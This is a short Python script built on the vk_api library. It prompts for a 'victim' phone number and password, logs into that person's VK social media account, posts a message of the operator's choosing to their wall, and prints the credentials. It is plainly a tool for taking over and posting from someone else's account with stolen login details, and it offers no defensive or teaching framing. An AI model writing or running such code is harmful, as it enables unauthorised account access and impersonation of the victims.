import vk_api
login = input("Enter victim number!:")

password = input("Enter victim password!:")
post = input("Enter What will be in VK post!:")
vk_session = vk_api.VkApi(login, password)
vk_session.auth()

vk = vk_session.get_api()
logs = ("Login: ") + (login) + (" Password: ") + (password)
print(vk.wall.post(message=post))
print(logs)
